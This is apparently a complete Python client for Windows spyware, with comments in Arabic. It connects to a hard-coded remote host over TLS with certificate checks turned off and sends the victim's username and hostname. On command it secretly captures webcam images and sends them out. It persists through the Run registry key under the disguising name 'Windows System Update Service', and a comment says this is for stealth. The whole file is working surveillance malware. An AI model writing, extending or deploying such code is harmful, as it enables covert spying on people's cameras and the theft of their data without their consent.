import socket
import ssl
import time
import threading
import struct
import os
import cv2
import sys
import winreg  # <-- المكتبة الجديدة للتعامل مع سجل ويندوز

# --- إعدادات الاتصال ---
SERVER_HOST = "192.168.0.103"
SERVER_PORT = 5555
RECONNECT_DELAY = 15
KEEP_ALIVE_INTERVAL = 20

# --- اسم البرنامج في سجل ويندوز (للتخفي) ---
REGISTRY_KEY_NAME = "Windows System Update Service"


def get_system_info():
    try:
        username = os.getlogin()
        hostname = socket.gethostname()
        return f"{username}@{hostname}"
    except Exception:
        return "UnknownUser@UnknownHost"


def send_data(sock, data_type, data):
    try:
        header = data_type.ljust(10) + struct.pack('<L', len(data))
        sock.sendall(header + data)
        return True
    except (ConnectionResetError, BrokenPipeError):
        return False


def capture_camera_image():
    print("[CAM] Accessing webcam...")
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
    if not cap.isOpened():
        return b"Error: Webcam could not be accessed."
    time.sleep(0.5)
    ret, frame = cap.read()
    cap.release()
    print("[CAM] Webcam released.")
    if not ret:
        return b"Error: Failed to capture frame."
    is_success, buffer = cv2.imencode(".jpg", frame)
    if not is_success:
        return b"Error: Failed to encode image."
    return buffer.tobytes()


def keep_alive_sender(sock, stop_event):
    while not stop_event.is_set():
        try:
            if not send_data(sock, b'PING', b''): break
            time.sleep(KEEP_ALIVE_INTERVAL)
        except:
            break
    print("[Keep-Alive] Sender stopped.")


def setup_persistence():

    # معرفة المسار الحالي للملف التنفيذي
    # `sys.executable` هو المسار الصحيح عندما يتم تحويل البرنامج إلى .exe
    exe_path = sys.executable

    # المسار في سجل ويندوز للبرامج التي تبدأ تلقائياً
    registry_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try:
        # فتح مفتاح التسجيل
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_WRITE)

        # إضافة البرنامج إلى السجل
        # سيتم إنشاء قيمة جديدة باسم REGISTRY_KEY_NAME ومسارها هو exe_path
        winreg.SetValueEx(key, REGISTRY_KEY_NAME, 0, winreg.REG_SZ, exe_path)

        # إغلاق المفتاح
        winreg.CloseKey(key)
        print(f"[PERSISTENCE] Successfully added to startup: {exe_path}")
    except Exception as e:
        print(f"[PERSISTENCE] Error: Failed to add to startup registry. {e}")


def main_connection():
    """الدالة الرئيسية التي تدير الاتصال واستقبال الأوامر."""

    # =============================================================
    # *** الخطوة الجديدة: تنفيذ دالة الثبات عند بدء التشغيل ***
    # سيتم تنفيذ هذا مرة واحدة فقط في كل مرة يبدأ فيها البرنامج
    setup_persistence()
    # =============================================================

    while True:
        secure_sock = None
        keep_alive_thread = None
        stop_keep_alive = threading.Event()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            secure_sock = context.wrap_socket(sock, server_hostname=SERVER_HOST)

            print(f"[*] Connecting to {SERVER_HOST}:{SERVER_PORT}...")
            secure_sock.connect((SERVER_HOST, SERVER_PORT))
            print("[+] Connected successfully.")

            if not send_data(secure_sock, b'SYS_INFO', get_system_info().encode('utf-8')):
                raise ConnectionError("Failed to send initial system info.")

            stop_keep_alive.clear()
            keep_alive_thread = threading.Thread(target=keep_alive_sender, args=(secure_sock, stop_keep_alive))
            keep_alive_thread.daemon = True
            keep_alive_thread.start()

            while True:
                command_bytes = secure_sock.recv(1024)
                if not command_bytes: break
                command = command_bytes.decode('utf-8', errors='ignore').strip()
                if command.lower() == "take_picture":
                    print("[CMD] Received 'take_picture' command.")
                    image_data = capture_camera_image()
                    print(f"[SEND] Sending image data ({len(image_data)} bytes)...")
                    if not send_data(secure_sock, b'IMG_DATA', image_data): break
                elif command.lower() == "exit":
                    break
        except Exception as e:
            print(f"[!] An error occurred: {e}")
        finally:
            stop_keep_alive.set()
            if keep_alive_thread: keep_alive_thread.join(timeout=1)
            if secure_sock: secure_sock.close()
            print(f"[*] Disconnected. Reconnecting in {RECONNECT_DELAY} seconds...")
            time.sleep(RECONNECT_DELAY)


if __name__ == "__main__":
    main_connection()
